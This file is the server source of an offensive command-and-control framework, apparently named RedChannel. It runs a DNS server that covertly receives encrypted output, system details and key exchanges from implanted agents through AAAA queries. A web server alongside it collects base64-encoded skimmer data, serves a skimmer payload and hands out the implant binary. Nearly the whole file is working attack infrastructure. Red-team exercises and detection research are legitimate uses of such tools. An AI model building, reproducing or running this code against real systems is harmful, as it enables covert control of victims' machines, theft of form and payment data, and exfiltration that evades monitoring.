const RC_VERSION = "0.3.0";

// move these to config?
const FLOOD_PROTECTION_TIMEOUT = 10;
const EXPECTED_DATA_SEGMENTS = 5;

const chalk = require("chalk");
const dnsd = require("dnsd");
const util = require("util");
const fs = require("fs");

var Crypto = require("./lib/crypto.js");
$crypto = new Crypto();

var RedChannel = require("./lib/redchannel.js");
$redchannel = new RedChannel(c2_message_handler);
$redchannel.app_root = __dirname;

var RedChannelUI = require("./lib/ui.js");
$ui = new RedChannelUI($redchannel, $crypto);

var $cmdline = require("commander");
$cmdline
    .version(RC_VERSION, "-v, --version")
    .usage("[options]")
    .option("-c, --config <path/to/rc.conf>", "specify a redchannel config file", $redchannel.config_file)
    .option("-p, --password <password>", "specify the password or set via env:RC_PASSWORD")
    .option("-c, --c2-domain <domain>", "specify the c2 domain", "")
    .option("-B, --ip [ip]", "bind dns c2 to ip", "")
    .option("-P, --port [port]", "listen for dns on a specific port", "")
    .option("-W, --web-ip [ip]", "bind web server to ip", "")
    .option("-Y, --web-port [port]", "listen for web on a specific port", "")
    .option("-I, --agent-interval [ms]", "check in interval for the agent", "")
    .option("-R, --agent-resolver [ip:port]", "set the resolver to use for the agent", "")
    .option("-d, --debug", "enable debug", false)

    .parse(process.argv);

$redchannel.config_file = $cmdline.config;

var banner = `
██████╗ ███████╗██████╗  ██████╗██╗  ██╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██╗     
██╔══██╗██╔════╝██╔══██╗██╔════╝██║  ██║██╔══██╗████╗  ██║████╗  ██║██╔════╝██║     
██████╔╝█████╗  ██║  ██║██║     ███████║███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██║     
██╔══██╗██╔══╝  ██║  ██║██║     ██╔══██║██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║     
██║  ██║███████╗██████╔╝╚██████╗██║  ██║██║  ██║██║ ╚████║██║ ╚████║███████╗███████╗
╚═╝  ╚═╝╚══════╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚══════╝
`;
$ui.msg(chalk.redBright(banner));

// read config file and merge with defaults to ensure properties exist
var merge = require("lodash.merge");
try {
    var config_data = JSON.parse(fs.readFileSync($redchannel.config_file).toString());
    $redchannel.config = merge($redchannel.config, config_data);
} catch (err) {
    $ui.msg(chalk.redBright("! cannot read configuration file: " + $redchannel.config_file + ", err: " + err.toString()));
    process.exit(1);
}

// env password takes priority over commandline
if (process.env.RC_PASSWORD && process.env.RC_PASSWORD.length > 0) {
    $ui.msg(chalk.gray("* using master password from environment variable"));
    $redchannel.config.c2.plaintext_password = process.env.RC_PASSWORD;
    $redchannel.master_password = $crypto.libcrypto.createHash("md5").update(process.env.RC_PASSWORD).digest("hex");
} else if ($cmdline.password && $cmdline.password.length > 0) {
    $ui.msg(chalk.gray("* using master password from command-line"));
    $redchannel.config.c2.plaintext_password = $cmdline.password;
    $redchannel.master_password = $crypto.libcrypto.createHash("md5").update($cmdline.password).digest("hex");
} else {
    $ui.msg(chalk.redBright("! please specify a master c2 password via command-lie or environment variable, see '--help'"));
    process.exit(1);
}

$redchannel.config.c2.domain = $cmdline.c2Domain.length > 0 ? $cmdline.c2Domain : $redchannel.config.c2.domain;
if ($redchannel.config.c2.domain.length == 0) {
    $ui.msg(chalk.redBright("! please specify the c2 domain via command-line or config file, see '--help'"));
    process.exit(1);
}

/**
 * optional arguments, default values set by commander ^
 */
if ($cmdline.ip) $redchannel.config.c2.dns_ip = $cmdline.ip;
if ($cmdline.port) $redchannel.config.c2.dns_port = $cmdline.port;
if ($cmdline.webIp) $redchannel.config.c2.web_ip = $cmdline.webIp;
if ($cmdline.webPort) $redchannel.config.c2.web_port = $cmdline.webPort;
if ($cmdline.agentInterval) $redchannel.config.implant.interval = $cmdline.agentInterval;
if ($cmdline.agentResolver) $redchannel.config.implant.resolver = $cmdline.agentResolver;

$ui.debug = $redchannel.config.debug;
$ui.debug = $cmdline.debug; // command-line debug overrides conf debug

if ($ui.debug) {
    $ui.msg(chalk.gray("* loaded redchannel config: " + JSON.stringify($redchannel.config)));
}
/**
 * UI
 */

/**
 * Web channel
 */
var $web_server = require("express")();

$web_server.listen($redchannel.config.c2.web_port, $redchannel.config.c2.web_ip, (err) => {
    if (err) {
        $ui.msg(chalk.redBright("! failed to start web server: " + err));
    }
    $ui.msg(chalk.gray("* c2-web listening on: " + $redchannel.config.c2.web_ip + ":" + $redchannel.config.c2.web_port));
});

/**
 * Skimmer routes
 */

// incoming skimmer data
$web_server.get($redchannel.config.skimmer.data_route, (request, response) => {
    if ($ui.debug) {
        $ui.msg(chalk.gray(`* incoming skimmer data: ${JSON.stringify(request.query)}`));
    }

    data = Buffer.from(request.query.id, "base64").toString();
    $ui.msg(chalk.greenBright("* incoming skimmer data: \n" + data));
    if ($ui.debug) {
        $ui.log("incoming skimmer data: " + data);
    }
    response.send("OK");
});

// server skimmer payload
$web_server.get($redchannel.config.skimmer.payload_route, (request, response) => {
    $ui.msg(chalk.gray("* incoming request for skimmer payload"));
    response.send($redchannel.modules.skimmer.payload);
});

// agent binary payload
$web_server.get($redchannel.config.c2.binary_route, (request, response) => {
    $ui.msg(chalk.gray("* incoming request for agent binary"));
    try {
        response.sendFile($redchannel.config.implant.output_file);
    } catch (e) {
        response.status(404).send("404 File Not Found");
    }
});

/**
 * Proxy loop
 */
function proxy_fetch_loop() {
    if (!$redchannel.config.proxy.enabled) {
        // if ($redchannel.modules.proxy.fetch_timer) clearTimeout($redchannel.modules.proxy.fetch_timer);
        return;
    }
    $redchannel.get_from_proxy();
    $redchannel.modules.proxy.fetch_timer = setTimeout(proxy_fetch_loop, $redchannel.config.proxy.interval);
}
proxy_fetch_loop();

/**
 * DNS channel
 */
var $dns_server = dnsd.createServer(c2_message_handler);
// prettier-ignore
$dns_server
    .zone(
        $redchannel.config.c2.domain,
        "ns1." + $redchannel.config.c2.domain,
        "root@" + $redchannel.config.c2.domain,
        "now",
        "2h",
        "30m",
        "2w",
        "10m"
    )
    .listen($redchannel.config.c2.dns_port, $redchannel.config.c2.dns_ip);

$ui.msg(chalk.gray(`* c2-dns listening on: ${$redchannel.config.c2.dns_ip}:${$redchannel.config.c2.dns_port}`));

/**
 * req: {
 *      connection: {
 *          remoteAddress: '127.0.0.1',
 *          type: 'AAAA'
 *      }
 * }
 * res: {
 *      question[0]: {
 *          type: 'AAAA',
 *          name: 'dns.query.tld'
 *      },
 *      answer: [],
 *      end: function(){}
 * }
 */
function c2_message_handler(req, res) {
    var question = res.question[0];
    var hostname = question.name;
    var ttl = 300; // Math.floor(Math.random() * 3600)

    if (typeof $redchannel.config.static_dns[hostname] != "undefined") {
        $ui.msg(chalk.gray(`* static_dns: responding request for host: '${hostname}' with ip '${$redchannel.config.static_dns[hostname]}'`));
        res.answer.push({
            name: hostname,
            type: "A",
            data: $redchannel.config.static_dns[hostname],
            ttl: ttl,
        });
        res.end();
        return;
    }

    if (!hostname.endsWith($redchannel.config.c2.domain)) {
        //$ui.msg(chalk.gray("! unknown c2 domain, ignoring query for: " + hostname));
        res.end();
        return;
    }
    if ($ui.debug) {
        $ui.msg(chalk.gray(util.format("* c2: %s:%s %s %s", req.connection.remoteAddress, req.connection.type, question.type, question.name)));
    }

    if (question.type !== "AAAA" && question.type !== "PROXY") {
        if ($ui.debug) {
            $ui.msg(chalk.gray(util.format("* c2: ignoring non-AAAA/non-PROXY query %s:%s %s %s", req.connection.remoteAddress, req.connection.type, question.type, question.name)));
        }
        res.end();
        return;
    }

    var segments = hostname.slice(0, hostname.length - $redchannel.config.c2.domain.length).split(".");
    if (segments.length < EXPECTED_DATA_SEGMENTS) {
        $ui.msg(chalk.redBright(util.format("! c2: invalid message, not enough data segments (%d, expected %d): %s", segments.length, EXPECTED_DATA_SEGMENTS, hostname)));
        res.end();
        return;
    }

    // used to prevent flooding
    var rand_id = segments[0];

    var agent_id = segments[1];
    if (typeof $redchannel.agents[agent_id] == "undefined") {
        $redchannel.init_agent(agent_id);
        $ui.msg(chalk.yellowBright(`* c2: first ping from agent ${chalk.blue(agent_id)}@${req.connection.remoteAddress}`));

        if (!$crypto.key) {
            $crypto.generate_keys();
        }

        $ui.msg(chalk.yellowBright(`* c2: keyx started with agent ${chalk.blue(agent_id)}`));
        $redchannel.command_keyx($crypto.export_pubkey("uncompressed"), agent_id);
    }
    $redchannel.agents[agent_id].lastseen = Math.floor(new Date() / 1000);
    $redchannel.agents[agent_id].ip = req.connection.remoteAddress;

    var command = 0;
    try {
        command = parseInt(segments[2].slice(0, 2), 16);
    } catch (ex) {
        $ui.msg(chalk.redBright("! c2: failed to parse command: " + ex.toString()));
        res.end();
        return;
    }

    // no need to check the incoming data, just send a queued up msg
    if (command == $redchannel.AGENT_CHECKIN) {
        if ($redchannel.agents[agent_id].sendq.length == 0) {
            // 03 means no data to send
            if ($ui.debug) {
                $ui.msg(chalk.gray(`* ${agent_id} checking in, no data to send`));
            }
            status = $redchannel.make_ip_string("03");
            res.answer.push({
                name: hostname,
                type: "AAAA",
                data: status,
                ttl: ttl,
            });
            res.end();
            return;
        }

        // we have already responded to this agent and rand_id combination
        // reset the flood protection timeout
        if ($redchannel.agents[agent_id].ignore[rand_id]) {
            clearTimeout($redchannel.agents[agent_id].ignore[rand_id]);
            $redchannel.agents[agent_id].ignore[rand_id] = setTimeout(function () {
                delete $redchannel.agents[agent_id].ignore[rand_id];
            }, FLOOD_PROTECTION_TIMEOUT);

            $ui.msg(chalk.gray("! c2: ignoring flood from agent: " + chalk.blue(agent_id) + ", rand_id: " + rand_id + ", command: " + command));
            res.end();
            return;
        }

        $ui.msg(chalk.gray("* agent " + chalk.blue(agent_id) + " checking in, sending next queued command"));
        records = $redchannel.agents[agent_id].sendq.shift();
        records.forEach(function (record) {
            res.answer.push({
                name: hostname,
                type: "AAAA",
                data: record,
                ttl: ttl,
            });
        });

        // flood protection, if the agent dns resolver retries a query, data can be lost
        $redchannel.agents[agent_id].ignore[rand_id] = setTimeout(function () {
            delete $redchannel.agents[agent_id].ignore[rand_id];
        }, FLOOD_PROTECTION_TIMEOUT);

        res.end();
        return;
    }

    var current_chunk = 0;
    var total_chunks = 0;
    try {
        current_chunk = parseInt(segments[2].slice(2, 4), 16);
        total_chunks = parseInt(segments[2].slice(4, 6), 16);
    } catch (ex) {
        $ui.msg(chalk.redBright("! c2: invalid chunk numbers, current: " + current_chunk + " / total: " + total_chunks));
        return;
    }

    var data_id = segments[3];
    if (data_id.length < 2) {
        $ui.msg(chalk.redBright("! c2: invalid data id: " + data_id));
        return;
    }

    var chunk = segments[4];
    if (chunk.length < 2) {
        $ui.msg(chalk.redBright("! c2: invalid chunk: " + chunk));
        return;
    }

    if (typeof $redchannel.agents[agent_id].recvq[command] == "undefined") {
        $redchannel.agents[agent_id].recvq[command] = {};
    }
    if (typeof $redchannel.agents[agent_id].recvq[command][data_id] == "undefined") {
        $redchannel.agents[agent_id].recvq[command][data_id] = {
            chunks: [],
            data: "",
        };
    }

    $redchannel.agents[agent_id].recvq[command][data_id]["chunks"][current_chunk] = chunk;
    if ($redchannel.count_data_chunks($redchannel.agents[agent_id].recvq[command][data_id]["chunks"]) == total_chunks) {
        data_to_process = $redchannel.agents[agent_id].recvq[command][data_id]["chunks"].join("");
        delete $redchannel.agents[agent_id].recvq[command][data_id];

        // process data, send back status (0f = failed, 02 = success)
        status = process_dns_data(agent_id, command, data_to_process);
        if (status) {
            res.answer.push({
                name: hostname,
                type: "AAAA",
                data: status,
                ttl: ttl,
            });
        }
    } else {
        // last byte 01 indicates more data is expected
        status = $redchannel.make_ip_string("01");
        res.answer.push({
            name: hostname,
            type: "AAAA",
            data: status,
            ttl: ttl,
        });
    }

    /*if (question.type == 'CNAME') {
        res.answer.push({ name: hostname, type: 'CNAME', data: "x.domain.tld", 'ttl': ttl })
    }
    if (question.type == 'A') {
        res.answer.push({ name: hostname, type: 'A', data: "1.1.1." + length, 'ttl': ttl })
    }*/
    res.end();
}

/**
 * Process decoded DNS data and respond
 * @param {*} agent_id
 * @param {*} command
 * @param {*} data
 * @returns Object immediate response over dns (success, more data, error)
 */
function process_dns_data(agent_id, command, data) {
    // default success status, 02 means data was received and processed successfully
    var status = $redchannel.make_ip_string("02");
    switch (command) {
        case $redchannel.AGENT_KEYX:
            if (!$redchannel.agents[agent_id].allow_keyx) {
                $ui.msg(chalk.redBright("! incoming keyx from " + chalk.blue(agent_id) + " not allowed, initiate keyx first"));
                break;
            }

            if (!$crypto.key) {
                $crypto.generate_keys();
            }

            agent_pubkey = Buffer.from(data, "hex");
            try {
                $redchannel.agents[agent_id].keyx = $crypto.import_uncompressed_pubkey(agent_pubkey);
            } catch (ex) {
                $ui.msg(chalk.redBright("! cannot import key for " + chalk.blue(agent_id) + ": " + ex.toString()));
                break;
            }
            $ui.msg(chalk.greenBright("agent(" + chalk.blue(agent_id) + ") keyx: " + $redchannel.agents[agent_id].keyx.asPublicECKey().toString("spki")));

            try {
                $redchannel.agents[agent_id].secret = $crypto.derive_secret($redchannel.agents[agent_id].keyx, $redchannel.master_password);
            } catch (ex) {
                $ui.msg(chalk.redBright("! cannot derive secret for " + chalk.blue(agent_id) + ": " + ex.toString()));
                break;
            }
            $ui.msg(chalk.greenBright("agent(" + chalk.blue(agent_id) + ") secret: " + $redchannel.agents[agent_id].secret.toString("hex")));
            if (!$redchannel.is_command_in_sendq(agent_id, $redchannel.AGENT_KEYX)) {
                $redchannel.agents[agent_id].allow_keyx = false; // if there are no more queued up keyx's, ignore further keyxs from agent
            }
            break;
        case $redchannel.AGENT_MSG:
            try {
                plaintext = decrypt_dns_message(agent_id, data);
            } catch (ex) {
                $ui.msg(chalk.redBright("! cannot decrypt message from " + chalk.blue(agent_id) + ": " + ex.toString()));
                break;
            }
            $ui.msg(chalk.greenBright("agent(" + chalk.blue(agent_id) + ") output>\n" + plaintext.toString() + ""));
            break;
        case $redchannel.AGENT_SYSINFO:
            try {
                plaintext = decrypt_dns_message(agent_id, data);
            } catch (ex) {
                $ui.msg(chalk.redBright("! cannot decrypt message from " + chalk.blue(agent_id) + ": " + ex.toString()));
                break;
            }

            sysinfo = plaintext.toString().split(";");
            userinfo = sysinfo[2].split(":");
            rows = [
                [chalk.yellowBright("hostname"), chalk.gray(sysinfo[0])],
                [chalk.yellowBright("ips"), chalk.gray(sysinfo[1])],
                [chalk.yellowBright("user"), chalk.gray(userinfo[0])],
                [chalk.yellowBright("uid"), chalk.gray(userinfo[1])],
                [chalk.yellowBright("gid"), chalk.gray(userinfo[2])],
            ];

            $ui.msg(chalk.greenBright("agent(" + chalk.blue(agent_id) + ") sysinfo>"));
            $ui.display_table([], rows);
            break;
    }
    return status;
}

function decrypt_dns_message(agent_id, data) {
    if (!agent_id) {
        throw new Error("invalid agent id");
    }
    if (!data) {
        throw new Error("invalid data");
    }
    if (!$redchannel.agents[agent_id].keyx) {
        throw new Error("missing keyx");
    }

    buffer = Buffer.from(data, "hex");
    iv = buffer.slice(0, $crypto.BLOCK_LENGTH);
    ciphertext = buffer.slice($crypto.BLOCK_LENGTH);

    // may throw errors
    plaintext = $crypto.aes_decrypt(ciphertext, $redchannel.agents[agent_id].secret, iv);
    return plaintext;
}
